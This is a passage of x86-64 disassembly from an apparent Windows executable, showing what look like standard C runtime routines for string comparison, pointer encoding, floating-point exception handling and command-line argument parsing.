   140003acd:	48 8b c7             	mov    %rdi,%rax
   140003ad0:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140003ad5:	48 83 c4 20          	add    $0x20,%rsp
   140003ad9:	5f                   	pop    %rdi
   140003ada:	c3                   	ret
   140003adb:	cc                   	int3
   140003adc:	4c 8b da             	mov    %rdx,%r11
   140003adf:	4c 8b d1             	mov    %rcx,%r10
   140003ae2:	4d 85 c0             	test   %r8,%r8
   140003ae5:	75 03                	jne    0x140003aea
   140003ae7:	33 c0                	xor    %eax,%eax
   140003ae9:	c3                   	ret
   140003aea:	41 0f b7 0a          	movzwl (%r10),%ecx
   140003aee:	4d 8d 52 02          	lea    0x2(%r10),%r10
   140003af2:	41 0f b7 13          	movzwl (%r11),%edx
   140003af6:	4d 8d 5b 02          	lea    0x2(%r11),%r11
   140003afa:	8d 41 bf             	lea    -0x41(%rcx),%eax
   140003afd:	83 f8 19             	cmp    $0x19,%eax
   140003b00:	44 8d 49 20          	lea    0x20(%rcx),%r9d
   140003b04:	8d 42 bf             	lea    -0x41(%rdx),%eax
   140003b07:	44 0f 47 c9          	cmova  %ecx,%r9d
   140003b0b:	83 f8 19             	cmp    $0x19,%eax
   140003b0e:	8d 4a 20             	lea    0x20(%rdx),%ecx
   140003b11:	41 8b c1             	mov    %r9d,%eax
   140003b14:	0f 47 ca             	cmova  %edx,%ecx
   140003b17:	2b c1                	sub    %ecx,%eax
   140003b19:	75 0b                	jne    0x140003b26
   140003b1b:	45 85 c9             	test   %r9d,%r9d
   140003b1e:	74 06                	je     0x140003b26
   140003b20:	49 83 e8 01          	sub    $0x1,%r8
   140003b24:	75 c4                	jne    0x140003aea
   140003b26:	c3                   	ret
   140003b27:	cc                   	int3
   140003b28:	48 89 0d b1 46 01 00 	mov    %rcx,0x146b1(%rip)        # 0x1400181e0
   140003b2f:	c3                   	ret
   140003b30:	40 53                	rex push %rbx
   140003b32:	48 83 ec 20          	sub    $0x20,%rsp
   140003b36:	48 8b d9             	mov    %rcx,%rbx
   140003b39:	e8 22 00 00 00       	call   0x140003b60
   140003b3e:	48 85 c0             	test   %rax,%rax
   140003b41:	74 14                	je     0x140003b57
   140003b43:	48 8b cb             	mov    %rbx,%rcx
   140003b46:	ff 15 3c 97 00 00    	call   *0x973c(%rip)        # 0x14000d288
   140003b4c:	85 c0                	test   %eax,%eax
   140003b4e:	74 07                	je     0x140003b57
   140003b50:	b8 01 00 00 00       	mov    $0x1,%eax
   140003b55:	eb 02                	jmp    0x140003b59
   140003b57:	33 c0                	xor    %eax,%eax
   140003b59:	48 83 c4 20          	add    $0x20,%rsp
   140003b5d:	5b                   	pop    %rbx
   140003b5e:	c3                   	ret
   140003b5f:	cc                   	int3
   140003b60:	40 53                	rex push %rbx
   140003b62:	48 83 ec 20          	sub    $0x20,%rsp
   140003b66:	33 c9                	xor    %ecx,%ecx
   140003b68:	e8 bb 24 00 00       	call   0x140006028
   140003b6d:	90                   	nop
   140003b6e:	48 8b 1d 8b 34 01 00 	mov    0x1348b(%rip),%rbx        # 0x140017000
   140003b75:	8b cb                	mov    %ebx,%ecx
   140003b77:	83 e1 3f             	and    $0x3f,%ecx
   140003b7a:	48 33 1d 5f 46 01 00 	xor    0x1465f(%rip),%rbx        # 0x1400181e0
   140003b81:	48 d3 cb             	ror    %cl,%rbx
   140003b84:	33 c9                	xor    %ecx,%ecx
   140003b86:	e8 f1 24 00 00       	call   0x14000607c
   140003b8b:	48 8b c3             	mov    %rbx,%rax
   140003b8e:	48 83 c4 20          	add    $0x20,%rsp
   140003b92:	5b                   	pop    %rbx
   140003b93:	c3                   	ret
   140003b94:	e9 ff 24 00 00       	jmp    0x140006098
   140003b99:	cc                   	int3
   140003b9a:	cc                   	int3
   140003b9b:	cc                   	int3
   140003b9c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003ba1:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140003ba6:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140003bab:	57                   	push   %rdi
   140003bac:	48 83 ec 20          	sub    $0x20,%rsp
   140003bb0:	48 8b f2             	mov    %rdx,%rsi
   140003bb3:	8b f9                	mov    %ecx,%edi
   140003bb5:	e8 76 19 00 00       	call   0x140005530
   140003bba:	45 33 c9             	xor    %r9d,%r9d
   140003bbd:	48 8b d8             	mov    %rax,%rbx
   140003bc0:	48 85 c0             	test   %rax,%rax
   140003bc3:	0f 84 3e 01 00 00    	je     0x140003d07
   140003bc9:	48 8b 08             	mov    (%rax),%rcx
   140003bcc:	48 8b c1             	mov    %rcx,%rax
   140003bcf:	4c 8d 81 c0 00 00 00 	lea    0xc0(%rcx),%r8
   140003bd6:	49 3b c8             	cmp    %r8,%rcx
   140003bd9:	74 0d                	je     0x140003be8
   140003bdb:	39 38                	cmp    %edi,(%rax)
   140003bdd:	74 0c                	je     0x140003beb
   140003bdf:	48 83 c0 10          	add    $0x10,%rax
   140003be3:	49 3b c0             	cmp    %r8,%rax
   140003be6:	75 f3                	jne    0x140003bdb
   140003be8:	49 8b c1             	mov    %r9,%rax
   140003beb:	48 85 c0             	test   %rax,%rax
   140003bee:	0f 84 13 01 00 00    	je     0x140003d07
   140003bf4:	4c 8b 40 08          	mov    0x8(%rax),%r8
   140003bf8:	4d 85 c0             	test   %r8,%r8
   140003bfb:	0f 84 06 01 00 00    	je     0x140003d07
   140003c01:	49 83 f8 05          	cmp    $0x5,%r8
   140003c05:	75 0d                	jne    0x140003c14
   140003c07:	4c 89 48 08          	mov    %r9,0x8(%rax)
   140003c0b:	41 8d 40 fc          	lea    -0x4(%r8),%eax
   140003c0f:	e9 f5 00 00 00       	jmp    0x140003d09
   140003c14:	49 83 f8 01          	cmp    $0x1,%r8
   140003c18:	75 08                	jne    0x140003c22
   140003c1a:	83 c8 ff             	or     $0xffffffff,%eax
   140003c1d:	e9 e7 00 00 00       	jmp    0x140003d09
   140003c22:	48 8b 6b 08          	mov    0x8(%rbx),%rbp
   140003c26:	48 89 73 08          	mov    %rsi,0x8(%rbx)
   140003c2a:	83 78 04 08          	cmpl   $0x8,0x4(%rax)
   140003c2e:	0f 85 ba 00 00 00    	jne    0x140003cee
   140003c34:	48 83 c1 30          	add    $0x30,%rcx
   140003c38:	48 8d 91 90 00 00 00 	lea    0x90(%rcx),%rdx
   140003c3f:	eb 08                	jmp    0x140003c49
   140003c41:	4c 89 49 08          	mov    %r9,0x8(%rcx)
   140003c45:	48 83 c1 10          	add    $0x10,%rcx
   140003c49:	48 3b ca             	cmp    %rdx,%rcx
   140003c4c:	75 f3                	jne    0x140003c41
   140003c4e:	81 38 8d 00 00 c0    	cmpl   $0xc000008d,(%rax)
   140003c54:	8b 7b 10             	mov    0x10(%rbx),%edi
   140003c57:	74 7a                	je     0x140003cd3
   140003c59:	81 38 8e 00 00 c0    	cmpl   $0xc000008e,(%rax)
   140003c5f:	74 6b                	je     0x140003ccc
   140003c61:	81 38 8f 00 00 c0    	cmpl   $0xc000008f,(%rax)
   140003c67:	74 5c                	je     0x140003cc5
   140003c69:	81 38 90 00 00 c0    	cmpl   $0xc0000090,(%rax)
   140003c6f:	74 4d                	je     0x140003cbe
   140003c71:	81 38 91 00 00 c0    	cmpl   $0xc0000091,(%rax)
   140003c77:	74 3e                	je     0x140003cb7
   140003c79:	81 38 92 00 00 c0    	cmpl   $0xc0000092,(%rax)
   140003c7f:	74 2f                	je     0x140003cb0
   140003c81:	81 38 93 00 00 c0    	cmpl   $0xc0000093,(%rax)
   140003c87:	74 20                	je     0x140003ca9
   140003c89:	81 38 b4 02 00 c0    	cmpl   $0xc00002b4,(%rax)
   140003c8f:	74 11                	je     0x140003ca2
   140003c91:	81 38 b5 02 00 c0    	cmpl   $0xc00002b5,(%rax)
   140003c97:	8b d7                	mov    %edi,%edx
   140003c99:	75 40                	jne    0x140003cdb
   140003c9b:	ba 8d 00 00 00       	mov    $0x8d,%edx
   140003ca0:	eb 36                	jmp    0x140003cd8
   140003ca2:	ba 8e 00 00 00       	mov    $0x8e,%edx
   140003ca7:	eb 2f                	jmp    0x140003cd8
   140003ca9:	ba 85 00 00 00       	mov    $0x85,%edx
   140003cae:	eb 28                	jmp    0x140003cd8
   140003cb0:	ba 8a 00 00 00       	mov    $0x8a,%edx
   140003cb5:	eb 21                	jmp    0x140003cd8
   140003cb7:	ba 84 00 00 00       	mov    $0x84,%edx
   140003cbc:	eb 1a                	jmp    0x140003cd8
   140003cbe:	ba 81 00 00 00       	mov    $0x81,%edx
   140003cc3:	eb 13                	jmp    0x140003cd8
   140003cc5:	ba 86 00 00 00       	mov    $0x86,%edx
   140003cca:	eb 0c                	jmp    0x140003cd8
   140003ccc:	ba 83 00 00 00       	mov    $0x83,%edx
   140003cd1:	eb 05                	jmp    0x140003cd8
   140003cd3:	ba 82 00 00 00       	mov    $0x82,%edx
   140003cd8:	89 53 10             	mov    %edx,0x10(%rbx)
   140003cdb:	b9 08 00 00 00       	mov    $0x8,%ecx
   140003ce0:	49 8b c0             	mov    %r8,%rax
   140003ce3:	ff 15 9f 95 00 00    	call   *0x959f(%rip)        # 0x14000d288
   140003ce9:	89 7b 10             	mov    %edi,0x10(%rbx)
   140003cec:	eb 10                	jmp    0x140003cfe
   140003cee:	8b 48 04             	mov    0x4(%rax),%ecx
   140003cf1:	4c 89 48 08          	mov    %r9,0x8(%rax)
   140003cf5:	49 8b c0             	mov    %r8,%rax
   140003cf8:	ff 15 8a 95 00 00    	call   *0x958a(%rip)        # 0x14000d288
   140003cfe:	48 89 6b 08          	mov    %rbp,0x8(%rbx)
   140003d02:	e9 13 ff ff ff       	jmp    0x140003c1a
   140003d07:	33 c0                	xor    %eax,%eax
   140003d09:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003d0e:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140003d13:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140003d18:	48 83 c4 20          	add    $0x20,%rsp
   140003d1c:	5f                   	pop    %rdi
   140003d1d:	c3                   	ret
   140003d1e:	cc                   	int3
   140003d1f:	cc                   	int3
   140003d20:	8b 05 c2 44 01 00    	mov    0x144c2(%rip),%eax        # 0x1400181e8
   140003d26:	c3                   	ret
   140003d27:	cc                   	int3
   140003d28:	89 0d ba 44 01 00    	mov    %ecx,0x144ba(%rip)        # 0x1400181e8
   140003d2e:	c3                   	ret
   140003d2f:	cc                   	int3
   140003d30:	48 8b 15 c9 32 01 00 	mov    0x132c9(%rip),%rdx        # 0x140017000
   140003d37:	8b ca                	mov    %edx,%ecx
   140003d39:	48 33 15 b0 44 01 00 	xor    0x144b0(%rip),%rdx        # 0x1400181f0
   140003d40:	83 e1 3f             	and    $0x3f,%ecx
   140003d43:	48 d3 ca             	ror    %cl,%rdx
   140003d46:	48 85 d2             	test   %rdx,%rdx
   140003d49:	0f 95 c0             	setne  %al
   140003d4c:	c3                   	ret
   140003d4d:	cc                   	int3
   140003d4e:	cc                   	int3
   140003d4f:	cc                   	int3
   140003d50:	48 89 0d 99 44 01 00 	mov    %rcx,0x14499(%rip)        # 0x1400181f0
   140003d57:	c3                   	ret
   140003d58:	48 8b 15 a1 32 01 00 	mov    0x132a1(%rip),%rdx        # 0x140017000
   140003d5f:	4c 8b c1             	mov    %rcx,%r8
   140003d62:	8b ca                	mov    %edx,%ecx
   140003d64:	48 33 15 85 44 01 00 	xor    0x14485(%rip),%rdx        # 0x1400181f0
   140003d6b:	83 e1 3f             	and    $0x3f,%ecx
   140003d6e:	48 d3 ca             	ror    %cl,%rdx
   140003d71:	48 85 d2             	test   %rdx,%rdx
   140003d74:	75 03                	jne    0x140003d79
   140003d76:	33 c0                	xor    %eax,%eax
   140003d78:	c3                   	ret
   140003d79:	49 8b c8             	mov    %r8,%rcx
   140003d7c:	48 8b c2             	mov    %rdx,%rax
   140003d7f:	48 ff 25 02 95 00 00 	rex.W jmp *0x9502(%rip)        # 0x14000d288
   140003d86:	cc                   	int3
   140003d87:	cc                   	int3
   140003d88:	4c 8b 05 71 32 01 00 	mov    0x13271(%rip),%r8        # 0x140017000
   140003d8f:	4c 8b c9             	mov    %rcx,%r9
   140003d92:	41 8b d0             	mov    %r8d,%edx
   140003d95:	b9 40 00 00 00       	mov    $0x40,%ecx
   140003d9a:	83 e2 3f             	and    $0x3f,%edx
   140003d9d:	2b ca                	sub    %edx,%ecx
   140003d9f:	49 d3 c9             	ror    %cl,%r9
   140003da2:	4d 33 c8             	xor    %r8,%r9
   140003da5:	4c 89 0d 44 44 01 00 	mov    %r9,0x14444(%rip)        # 0x1400181f0
   140003dac:	c3                   	ret
   140003dad:	cc                   	int3
   140003dae:	cc                   	int3
   140003daf:	cc                   	int3
   140003db0:	48 8b c4             	mov    %rsp,%rax
   140003db3:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140003db7:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140003dbb:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140003dbf:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140003dc3:	41 54                	push   %r12
   140003dc5:	41 56                	push   %r14
   140003dc7:	41 57                	push   %r15
   140003dc9:	48 83 ec 20          	sub    $0x20,%rsp
   140003dcd:	4c 8b 7c 24 60       	mov    0x60(%rsp),%r15
   140003dd2:	4d 8b e1             	mov    %r9,%r12
   140003dd5:	49 8b d8             	mov    %r8,%rbx
   140003dd8:	4c 8b f2             	mov    %rdx,%r14
   140003ddb:	48 8b f9             	mov    %rcx,%rdi
   140003dde:	49 83 27 00          	andq   $0x0,(%r15)
   140003de2:	49 c7 01 01 00 00 00 	movq   $0x1,(%r9)
   140003de9:	48 85 d2             	test   %rdx,%rdx
   140003dec:	74 07                	je     0x140003df5
   140003dee:	48 89 1a             	mov    %rbx,(%rdx)
   140003df1:	49 83 c6 08          	add    $0x8,%r14
   140003df5:	40 32 ed             	xor    %bpl,%bpl
   140003df8:	80 3f 22             	cmpb   $0x22,(%rdi)
   140003dfb:	75 0f                	jne    0x140003e0c
   140003dfd:	40 84 ed             	test   %bpl,%bpl
   140003e00:	40 b6 22             	mov    $0x22,%sil
   140003e03:	40 0f 94 c5          	sete   %bpl
   140003e07:	48 ff c7             	inc    %rdi
   140003e0a:	eb 37                	jmp    0x140003e43
   140003e0c:	49 ff 07             	incq   (%r15)
   140003e0f:	48 85 db             	test   %rbx,%rbx
   140003e12:	74 07                	je     0x140003e1b
   140003e14:	8a 07                	mov    (%rdi),%al
   140003e16:	88 03                	mov    %al,(%rbx)
   140003e18:	48 ff c3             	inc    %rbx
   140003e1b:	0f be 37             	movsbl (%rdi),%esi
   140003e1e:	48 ff c7             	inc    %rdi
   140003e21:	8b ce                	mov    %esi,%ecx
   140003e23:	e8 58 3a 00 00       	call   0x140007880
   140003e28:	85 c0                	test   %eax,%eax
   140003e2a:	74 12                	je     0x140003e3e
   140003e2c:	49 ff 07             	incq   (%r15)
   140003e2f:	48 85 db             	test   %rbx,%rbx
   140003e32:	74 07                	je     0x140003e3b
   140003e34:	8a 07                	mov    (%rdi),%al
   140003e36:	88 03                	mov    %al,(%rbx)
   140003e38:	48 ff c3             	inc    %rbx
   140003e3b:	48 ff c7             	inc    %rdi
   140003e3e:	40 84 f6             	test   %sil,%sil
   140003e41:	74 1c                	je     0x140003e5f
   140003e43:	40 84 ed             	test   %bpl,%bpl
   140003e46:	75 b0                	jne    0x140003df8
   140003e48:	40 80 fe 20          	cmp    $0x20,%sil
   140003e4c:	74 06                	je     0x140003e54
   140003e4e:	40 80 fe 09          	cmp    $0x9,%sil
   140003e52:	75 a4                	jne    0x140003df8
   140003e54:	48 85 db             	test   %rbx,%rbx
   140003e57:	74 09                	je     0x140003e62
   140003e59:	c6 43 ff 00          	movb   $0x0,-0x1(%rbx)
   140003e5d:	eb 03                	jmp    0x140003e62
   140003e5f:	48 ff cf             	dec    %rdi
   140003e62:	40 32 f6             	xor    %sil,%sil
   140003e65:	8a 07                	mov    (%rdi),%al
   140003e67:	84 c0                	test   %al,%al
   140003e69:	0f 84 d4 00 00 00    	je     0x140003f43
   140003e6f:	3c 20                	cmp    $0x20,%al
   140003e71:	74 04                	je     0x140003e77
   140003e73:	3c 09                	cmp    $0x9,%al
   140003e75:	75 07                	jne    0x140003e7e
   140003e77:	48 ff c7             	inc    %rdi
   140003e7a:	8a 07                	mov    (%rdi),%al
   140003e7c:	eb f1                	jmp    0x140003e6f
   140003e7e:	84 c0                	test   %al,%al
   140003e80:	0f 84 bd 00 00 00    	je     0x140003f43
   140003e86:	4d 85 f6             	test   %r14,%r14
   140003e89:	74 07                	je     0x140003e92
   140003e8b:	49 89 1e             	mov    %rbx,(%r14)
   140003e8e:	49 83 c6 08          	add    $0x8,%r14
   140003e92:	49 ff 04 24          	incq   (%r12)
   140003e96:	ba 01 00 00 00       	mov    $0x1,%edx
   140003e9b:	33 c0                	xor    %eax,%eax
   140003e9d:	eb 05                	jmp    0x140003ea4
   140003e9f:	48 ff c7             	inc    %rdi
   140003ea2:	ff c0                	inc    %eax
   140003ea4:	8a 0f                	mov    (%rdi),%cl
   140003ea6:	80 f9 5c             	cmp    $0x5c,%cl
   140003ea9:	74 f4                	je     0x140003e9f
   140003eab:	80 f9 22             	cmp    $0x22,%cl
   140003eae:	75 30                	jne    0x140003ee0
   140003eb0:	84 c2                	test   %al,%dl
   140003eb2:	75 18                	jne    0x140003ecc
   140003eb4:	40 84 f6             	test   %sil,%sil
   140003eb7:	74 0a                	je     0x140003ec3
   140003eb9:	38 4f 01             	cmp    %cl,0x1(%rdi)
   140003ebc:	75 05                	jne    0x140003ec3
   140003ebe:	48 ff c7             	inc    %rdi
   140003ec1:	eb 09                	jmp    0x140003ecc
   140003ec3:	33 d2                	xor    %edx,%edx
   140003ec5:	40 84 f6             	test   %sil,%sil
   140003ec8:	40 0f 94 c6          	sete   %sil
   140003ecc:	d1 e8                	shr    $1,%eax
   140003ece:	eb 10                	jmp    0x140003ee0
   140003ed0:	ff c8                	dec    %eax
   140003ed2:	48 85 db             	test   %rbx,%rbx
   140003ed5:	74 06                	je     0x140003edd
   140003ed7:	c6 03 5c             	movb   $0x5c,(%rbx)
   140003eda:	48 ff c3             	inc    %rbx
   140003edd:	49 ff 07             	incq   (%r15)
   140003ee0:	85 c0                	test   %eax,%eax
   140003ee2:	75 ec                	jne    0x140003ed0
   140003ee4:	8a 07                	mov    (%rdi),%al
   140003ee6:	84 c0                	test   %al,%al
   140003ee8:	74 46                	je     0x140003f30
   140003eea:	40 84 f6             	test   %sil,%sil
   140003eed:	75 08                	jne    0x140003ef7
   140003eef:	3c 20                	cmp    $0x20,%al
   140003ef1:	74 3d                	je     0x140003f30
   140003ef3:	3c 09                	cmp    $0x9,%al
   140003ef5:	74 39                	je     0x140003f30
   140003ef7:	85 d2                	test   %edx,%edx
   140003ef9:	74 2d                	je     0x140003f28
   140003efb:	48 85 db             	test   %rbx,%rbx
   140003efe:	74 07                	je     0x140003f07
   140003f00:	88 03                	mov    %al,(%rbx)
   140003f02:	48 ff c3             	inc    %rbx
   140003f05:	8a 07                	mov    (%rdi),%al
   140003f07:	0f be c8             	movsbl %al,%ecx
   140003f0a:	e8 71 39 00 00       	call   0x140007880
   140003f0f:	85 c0                	test   %eax,%eax
   140003f11:	74 12                	je     0x140003f25
   140003f13:	49 ff 07             	incq   (%r15)
   140003f16:	48 ff c7             	inc    %rdi
   140003f19:	48 85 db             	test   %rbx,%rbx
   140003f1c:	74 07                	je     0x140003f25
   140003f1e:	8a 07                	mov    (%rdi),%al
   140003f20:	88 03                	mov    %al,(%rbx)
   140003f22:	48 ff c3             	inc    %rbx
   140003f25:	49 ff 07             	incq   (%r15)
   140003f28:	48 ff c7             	inc    %rdi
   140003f2b:	e9 66 ff ff ff       	jmp    0x140003e96
   140003f30:	48 85 db             	test   %rbx,%rbx
   140003f33:	74 06                	je     0x140003f3b
   140003f35:	c6 03 00             	movb   $0x0,(%rbx)
   140003f38:	48 ff c3             	inc    %rbx
   140003f3b:	49 ff 07             	incq   (%r15)
   140003f3e:	e9 22 ff ff ff       	jmp    0x140003e65
   140003f43:	4d 85 f6             	test   %r14,%r14
   140003f46:	74 04                	je     0x140003f4c
   140003f48:	49 83 26 00          	andq   $0x0,(%r14)
   140003f4c:	49 ff 04 24          	incq   (%r12)
   140003f50:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140003f55:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   140003f5a:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   140003f5f:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   140003f64:	48 83 c4 20          	add    $0x20,%rsp
   140003f68:	41 5f                	pop    %r15
   140003f6a:	41 5e                	pop    %r14
   140003f6c:	41 5c                	pop    %r12
   140003f6e:	c3                   	ret
   140003f6f:	cc                   	int3
   140003f70:	40 53                	rex push %rbx
   140003f72:	48 83 ec 20          	sub    $0x20,%rsp
   140003f76:	48 b8 ff ff ff ff ff 	movabs $0x1fffffffffffffff,%rax
   140003f7d:	ff ff 1f 
   140003f80:	4c 8b ca             	mov    %rdx,%r9
   140003f83:	48 3b c8             	cmp    %rax,%rcx
   140003f86:	73 3d                	jae    0x140003fc5
   140003f88:	33 d2                	xor    %edx,%edx
   140003f8a:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   140003f8e:	49 f7 f0             	div    %r8
   140003f91:	4c 3b c8             	cmp    %rax,%r9
   140003f94:	73 2f                	jae    0x140003fc5
   140003f96:	48 c1 e1 03          	shl    $0x3,%rcx
   140003f9a:	4d 0f af c8          	imul   %r8,%r9
   140003f9e:	48 8b c1             	mov    %rcx,%rax
   140003fa1:	48 f7 d0             	not    %rax
   140003fa4:	49 3b c1             	cmp    %r9,%rax
   140003fa7:	76 1c                	jbe    0x140003fc5
   140003fa9:	49 03 c9             	add    %r9,%rcx
   140003fac:	ba 01 00 00 00       	mov    $0x1,%edx
   140003fb1:	e8 42 21 00 00       	call   0x1400060f8
   140003fb6:	33 c9                	xor    %ecx,%ecx
   140003fb8:	48 8b d8             	mov    %rax,%rbx
   140003fbb:	e8 b0 21 00 00       	call   0x140006170
   140003fc0:	48 8b c3             	mov    %rbx,%rax
   140003fc3:	eb 02                	jmp    0x140003fc7
   140003fc5:	33 c0                	xor    %eax,%eax
   140003fc7:	48 83 c4 20          	add    $0x20,%rsp
   140003fcb:	5b                   	pop    %rbx
   140003fcc:	c3                   	ret
   140003fcd:	cc                   	int3
   140003fce:	cc                   	int3
   140003fcf:	cc                   	int3
   140003fd0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003fd5:	55                   	push   %rbp
   140003fd6:	56                   	push   %rsi
   140003fd7:	57                   	push   %rdi
   140003fd8:	41 56                	push   %r14
   140003fda:	41 57                	push   %r15
   140003fdc:	48 8b ec             	mov    %rsp,%rbp
   140003fdf:	48 83 ec 30          	sub    $0x30,%rsp
   140003fe3:	33 ff                	xor    %edi,%edi
   140003fe5:	44 8b f1             	mov    %ecx,%r14d
   140003fe8:	85 c9                	test   %ecx,%ecx
   140003fea:	0f 84 53 01 00 00    	je     0x140004143
   140003ff0:	8d 41 ff             	lea    -0x1(%rcx),%eax
   140003ff3:	83 f8 01             	cmp    $0x1,%eax
   140003ff6:	76 16                	jbe    0x14000400e
   140003ff8:	e8 93 19 00 00       	call   0x140005990
   140003ffd:	8d 5f 16             	lea    0x16(%rdi),%ebx
   140004000:	89 18                	mov    %ebx,(%rax)
   140004002:	e8 69 18 00 00       	call   0x140005870
   140004007:	8b fb                	mov    %ebx,%edi
   140004009:	e9 35 01 00 00       	jmp    0x140004143
   14000400e:	e8 bd 34 00 00       	call   0x1400074d0
   140004013:	48 8d 1d e6 41 01 00 	lea    0x141e6(%rip),%rbx        # 0x140018200
   14000401a:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   140004020:	48 8b d3             	mov    %rbx,%rdx
   140004023:	33 c9                	xor    %ecx,%ecx
   140004025:	e8 5e 2c 00 00       	call   0x140006c88
   14000402a:	48 8b 35 87 47 01 00 	mov    0x14787(%rip),%rsi        # 0x1400187b8
   140004031:	48 89 1d 60 47 01 00 	mov    %rbx,0x14760(%rip)        # 0x140018798
   140004038:	48 85 f6             	test   %rsi,%rsi
   14000403b:	74 05                	je     0x140004042
   14000403d:	40 38 3e             	cmp    %dil,(%rsi)
   140004040:	75 03                	jne    0x140004045
   140004042:	48 8b f3             	mov    %rbx,%rsi
   140004045:	48 8d 45 48          	lea    0x48(%rbp),%rax
   140004049:	48 89 7d 40          	mov    %rdi,0x40(%rbp)
   14000404d:	4c 8d 4d 40          	lea    0x40(%rbp),%r9
   140004051:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140004056:	45 33 c0             	xor    %r8d,%r8d
   140004059:	48 89 7d 48          	mov    %rdi,0x48(%rbp)
   14000405d:	33 d2                	xor    %edx,%edx
   14000405f:	48 8b ce             	mov    %rsi,%rcx
   140004062:	e8 49 fd ff ff       	call   0x140003db0
   140004067:	4c 8b 7d 40          	mov    0x40(%rbp),%r15
   14000406b:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140004071:	48 8b 55 48          	mov    0x48(%rbp),%rdx
   140004075:	49 8b cf             	mov    %r15,%rcx
   140004078:	e8 f3 fe ff ff       	call   0x140003f70
   14000407d:	48 8b d8             	mov    %rax,%rbx
   140004080:	48 85 c0             	test   %rax,%rax
   140004083:	75 18                	jne    0x14000409d
   140004085:	e8 06 19 00 00       	call   0x140005990
   14000408a:	bb 0c 00 00 00       	mov    $0xc,%ebx
   14000408f:	33 c9                	xor    %ecx,%ecx
   140004091:	89 18                	mov    %ebx,(%rax)
   140004093:	e8 d8 20 00 00       	call   0x140006170
   140004098:	e9 6a ff ff ff       	jmp    0x140004007
   14000409d:	4e 8d 04 f8          	lea    (%rax,%r15,8),%r8
   1400040a1:	48 8b d3             	mov    %rbx,%rdx
   1400040a4:	48 8d 45 48          	lea    0x48(%rbp),%rax
   1400040a8:	48 8b ce             	mov    %rsi,%rcx
   1400040ab:	4c 8d 4d 40          	lea    0x40(%rbp),%r9
   1400040af:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400040b4:	e8 f7 fc ff ff       	call   0x140003db0
   1400040b9:	41 83 fe 01          	cmp    $0x1,%r14d
   1400040bd:	75 16                	jne    0x1400040d5
   1400040bf:	8b 45 40             	mov    0x40(%rbp),%eax
   1400040c2:	ff c8                	dec    %eax
   1400040c4:	48 89 1d dd 46 01 00 	mov    %rbx,0x146dd(%rip)        # 0x1400187a8
   1400040cb:	89 05 cf 46 01 00    	mov    %eax,0x146cf(%rip)        # 0x1400187a0
   1400040d1:	33 c9                	xor    %ecx,%ecx
   1400040d3:	eb 69                	jmp    0x14000413e
   1400040d5:	48 8d 55 38          	lea    0x38(%rbp),%rdx
   1400040d9:	48 89 7d 38          	mov    %rdi,0x38(%rbp)
   1400040dd:	48 8b cb             	mov    %rbx,%rcx
   1400040e0:	e8 87 2a 00 00       	call   0x140006b6c
   1400040e5:	8b f0                	mov    %eax,%esi
   1400040e7:	85 c0                	test   %eax,%eax
   1400040e9:	74 19                	je     0x140004104
   1400040eb:	48 8b 4d 38          	mov    0x38(%rbp),%rcx
   1400040ef:	e8 7c 20 00 00       	call   0x140006170
   1400040f4:	48 8b cb             	mov    %rbx,%rcx
   1400040f7:	48 89 7d 38          	mov    %rdi,0x38(%rbp)
   1400040fb:	e8 70 20 00 00       	call   0x140006170
   140004100:	8b fe                	mov    %esi,%edi
   140004102:	eb 3f                	jmp    0x140004143
   140004104:	48 8b 55 38          	mov    0x38(%rbp),%rdx
   140004108:	48 8b cf             	mov    %rdi,%rcx
   14000410b:	48 8b c2             	mov    %rdx,%rax
   14000410e:	48 39 3a             	cmp    %rdi,(%rdx)
   140004111:	74 0c                	je     0x14000411f
   140004113:	48 8d 40 08          	lea    0x8(%rax),%rax
   140004117:	48 ff c1             	inc    %rcx
   14000411a:	48 39 38             	cmp    %rdi,(%rax)
   14000411d:	75 f4                	jne    0x140004113
   14000411f:	89 0d 7b 46 01 00    	mov    %ecx,0x1467b(%rip)        # 0x1400187a0
   140004125:	33 c9                	xor    %ecx,%ecx
   140004127:	48 89 7d 38          	mov    %rdi,0x38(%rbp)
   14000412b:	48 89 15 76 46 01 00 	mov    %rdx,0x14676(%rip)        # 0x1400187a8
   140004132:	e8 39 20 00 00       	call   0x140006170
   140004137:	48 8b cb             	mov    %rbx,%rcx
   14000413a:	48 89 7d 38          	mov    %rdi,0x38(%rbp)
   14000413e:	e8 2d 20 00 00       	call   0x140006170
   140004143:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140004148:	8b c7                	mov    %edi,%eax
   14000414a:	48 83 c4 30          	add    $0x30,%rsp
   14000414e:	41 5f                	pop    %r15
   140004150:	41 5e                	pop    %r14
   140004152:	5f                   	pop    %rdi
   140004153:	5e                   	pop    %rsi
   140004154:	5d                   	pop    %rbp
   140004155:	c3                   	ret
   140004156:	cc                   	int3
   140004157:	cc                   	int3
   140004158:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000415d:	57                   	push   %rdi
   14000415e:	48 83 ec 20          	sub    $0x20,%rsp
   140004162:	33 ff                	xor    %edi,%edi
   140004164:	48 39 3d 9d 41 01 00 	cmp    %rdi,0x1419d(%rip)        # 0x140018308
   14000416b:	74 04                	je     0x140004171
   14000416d:	33 c0                	xor    %eax,%eax
   14000416f:	eb 48                	jmp    0x1400041b9
   140004171:	e8 5a 33 00 00       	call   0x1400074d0
   140004176:	e8 4d 38 00 00       	call   0x1400079c8
   14000417b:	48 8b d8             	mov    %rax,%rbx
